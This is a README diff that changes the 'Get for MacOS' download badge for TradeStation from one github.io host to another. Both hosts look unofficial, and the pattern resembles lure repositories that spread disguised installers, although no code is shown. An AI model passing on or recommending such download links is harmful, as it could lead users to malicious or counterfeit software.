@@ -8,7 +8,7 @@
 
 <div align="center">  
 
-[![Get for MacOS](https://img.shields.io/badge/🍎_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://onanizm-apps-software.github.io/.github/TradeStation)  
+[![Get for MacOS](https://img.shields.io/badge/🍎_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://deployed-soft.github.io/.github/TradeStation)  
 
 </div>  
 
